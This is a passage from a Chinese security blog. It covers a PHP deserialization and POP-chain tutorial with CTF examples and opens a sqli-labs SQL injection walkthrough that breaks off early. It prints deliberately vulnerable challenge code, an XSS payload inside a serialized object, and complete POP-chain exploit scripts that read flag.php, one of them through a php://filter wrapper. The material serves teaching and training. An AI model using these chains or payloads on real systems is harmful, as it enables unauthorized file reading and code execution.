class="subst">$this</span>-&gt;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$person1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line">    <span class="variable">$mid</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$person1</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$mid</span>);</span><br></pre></td></tr></table></figure>

<p>本地运行：</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650979275764-8fc54f7f-f865-41ca-ab69-e0f010973818.png" alt="img"></p>
<p>url拼接mid参数后访问浏览器：</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650979379510-689b934d-474d-40fc-8b02-bb8ef144a8bb.png" alt="img"></p>
<p>可以清楚的看到，传递序列化后的字符串成功的被后台的unserialize()还原成了原本的person类，从而触发了__wakeup魔术方法，最终eval()成功的将$name的值 echo ‘I am isee’将PHP代码解析，输出了I am isee字样</p>
<p>那么，如果我们自定义这个序列化后的特殊字符串，会怎么样？</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650980739535-027c0865-127f-4687-be53-8353d100e8ab.png" alt="img"></p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650980680493-ab62722a-d8ab-42ae-869a-51200f2edbac.png" alt="img"></p>
<p><strong>简单小结一下PHP序列化与反序列化漏洞的成因：</strong></p>
<p>反序列化本身不是漏洞，但如果<code>PHP序列化与反序列化的过程用户可控</code>，那么在反序列化过程中就会自动执行魔术方法，从而导致安全问题</p>
<p>所以，通常反序列化漏洞的成因在于代码中的 <code>__unserialize()</code>,<code>__wakeup()</code>等魔术方法接收的参数可控，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650981834094-b04c4e6d-54cd-463c-9cb7-47f84779321c.png" alt="img"></p>
<p>查看源代码，是哪行代码造成了这个反序列化漏洞</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650982481650-532cec7d-efb5-4dea-8374-eccbb0202843.png" alt="img"></p>
<p>发现<code>__construct()函数，</code>说明在创建对象时就会自动调用echo $this-&gt;test;</p>
<p>将以下类进行序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;攻击语句，如()&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据源代码得到语句：</p>
<p>O:1:”S”:1:{s:4:”test”;s:29:”<script>alert('xss')</script>“;}</p>
<p>先用排除法，先把33行注释掉， 输入payload<code>（O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;）</code>之后没有弹框，说明这不是__construct()的锅，到此已经可以判断是第33行起的作用了，保险起见还是再试一下。  </p>
<p>然后放出33行，把__construct()注释，输入payload（O:1:”S”:1:{s:4:”test”;s:29:”<script>alert('xss')</script>“;}）之后发现弹窗。</p>
<p>原因是： __construct()这个函数虽然在对象创建时会被调用，但反序列化（unserialize()）的时候并不会被调用。  </p>
<h1 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h1><p>反序列化的漏洞是以控制魔术方法为出发点，通过魔术方法来达到攻击的目的，但是很多时候很难直接通过魔术方法找到可以攻击的点，所以就需要寻找相同函数名将类的属性和敏感函数的属性联系起来，使得部分属性被我们所控制，从而达到攻击目的。这就是<strong>POP链</strong></p>
<h2 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<ol>
<li>先看读文件的函数在哪：</li>
</ol>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569028390-a74e869e-b94f-470e-8740-4bb62d5ea0a9.png" alt="img"></p>
<ol>
<li>我们可控的是<code>hello参数</code>，调用<code>unserialize()</code>函数，即<code>__wakeup()</code>魔术方法，于是就只有Show类中存在该方法，但是注意到在Show.__wakeup()中存在一个<code>正则匹配</code>，这个正则匹配会将<code>$this-&gt;source</code>当成字符串来处理。也就是说会调用Show.<code>__toString()</code>方法。</li>
</ol>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569368590-46066570-31cc-4162-8b0d-9fe5e1c85f97.png" alt="img"></p>
<ol>
<li>定位到Show.<code>__toString()</code>，可以将<code>source</code>序列化为<code>Show类</code>的对象，就会调用__toString方法。__toString又会取一个<code>str[&#39;str&#39;]-&gt;source</code>，那么如果这个source不存在的话，就会执行<code>__get()</code>方法。</li>
</ol>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569456460-271f9990-534a-41dd-983e-88817e46d7e3.png" alt="img"></p>
<ol>
<li><code>__get()</code>魔术方法会调用一个<code>$p</code>变量，这个也是可控的，然后会将p当做函数调用，此时触发了Read.<code>__invoke()</code>魔术方法</li>
</ol>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569667295-b74fee32-0ed4-4380-adcc-e5455afcae36.png" alt="img"></p>
<ol>
<li><code>__invoke</code>魔术方法会触发<code>file_get()函数</code>,进而<code>base64_encode(file_get_contents($value)</code>)最终达到读文件的目的</li>
<li>对应关系：hello是Show的对象，source属性是Test的对象，p属性是Read的对象</li>
</ol>
<p>一条完整的链就形成了</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569738629-7e66a481-8c28-474a-9e06-c0ff459b158c.png" alt="img"></p>
<p>这样一条完整的链就分析完了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello -&gt; __wakeup -&gt; Show._show -&gt; Show.__toString -&gt; (不存在属性)Test.<span class="title function_ invoke__">__get</span>() -&gt; Read.__invoke</span><br></pre></td></tr></table></figure>

<p>写一个pop链</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$read</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;p = <span class="variable">$read</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;source = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>);<span class="comment">//在存在private和protected属性的情况下还是需要使用urlencode的。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">      <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<p>Modifier类</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651637062612-c7eee25d-dd33-4e57-b8ef-1dd785c928fe.png" alt="img"></p>
<p>show类</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651637607103-76e39b85-9977-42f8-b7af-a66fc3bccedc.png" alt="img"></p>
<p>在<code>__toString</code>方法可以看到<code>return $this-&gt;str-&gt;source</code>，如果让str &#x3D; Test()，那么就会访问Test-&gt;source，这时就会触发<code>__get</code>，然而触发__toString为把类转换为字符串，这在__wakeup中的<code>if(preg_match(&quot;/gopher|http|file|ftp|https|dict|../i&quot;, $this-&gt;source))</code>实现，同时__wakeup在反序列化时会自动调用，所以我们要把$this-&gt;source设置为Show类的实例化对象</p>
<p>Test类</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651643182075-05e47c76-8d5a-4744-9a1f-3e6c043984e2.png" alt="img"></p>
<p><code>__get</code>，<code>return $function()</code>，和之前的<code>__invoke</code>结合就是一个利用链，所以当前目标就变为了如何触发__get()，当访问一个不可访问或者不存在的成员变量就可以触发__get()</p>
<p>但是这两个类都没有可以直接利用的点，想利用__invoke就要先利用__get，然而__get需要访问不存在的的成员变量才可以触发，然而无论Test里面的哪个方法都没有访问到不存在的成员变量</p>
<p>构造pop链</p>
<p>Show类(__construct)–&gt;Show类(__wakeup)–&gt;Show类(__toString)–&gt;Test类(__get)–&gt;Modifier类(__invoke)</p>
<p>首先先实例化show</p>
<p>$a &#x3D; new show(‘aaa’);</p>
<p>然后再把Test的实例化对象赋值给a-&gt;str</p>
<p>$a-&gt;str&#x3D;new Test();</p>
<p>为了触发__invoke所以要把Modifier的实例化对象赋值给a-&gt;str-&gt;p</p>
<p>$a-&gt;str-&gt;p&#x3D;new Modifier();</p>
<p>为了触发__invoke所以要把Modifier的实例化对象赋值给a-&gt;str-&gt;p</p>
<p>$b&#x3D;new Show($a);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sqli-labs刷题记录page-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/" class="article-date">
      <time datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/">sqli-labs刷题记录page-1</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="page-1（Basic-Injections）"><a href="#page-1（Basic-Injections）" class="headerlink" title="page-1（Basic Injections）"></a>page-1（Basic Injections）</h1><h2 id="1-10-GET传输"><a href="#1-10-GET传输" class="headerlink" title="1~10 GET传输"></a>1~10 GET传输</h2><h3 id="Less-1单引号字符型注入-‘"><a href="#Less-1单引号字符型注入-‘" class="headerlink" title="Less-1单引号字符型注入[‘]"></a>Less-1单引号字符型注入[‘]</h3><blockquote>
<p>– （这里有一个空格，–空格）在SQL内表示注释，但在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用–+代替– ，原因是+在URL被URL编码后会变成空格</p>
</blockquote>
<p>1.经过and 1&#x3D;2测试，页面回显正常，所以该地方不是数值查询</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222104926338.png" alt="image-20220222104926338"></p>
<p>2.接着尝试在id后面加上单引号’，发现页面回显不正常，表示可能存在SQL字符注入</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222104956660.png" alt="image-20220222104956660"></p>
<p>3.输入–+后发现页面回显正常，则这个地方是单引号字符注入型</p>
<p><img src="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/image-20220222105013218.png" alt="image-20220222105013218"></p>
<p>4.接着使用order by 语句可以判断该表一共有3列</p>
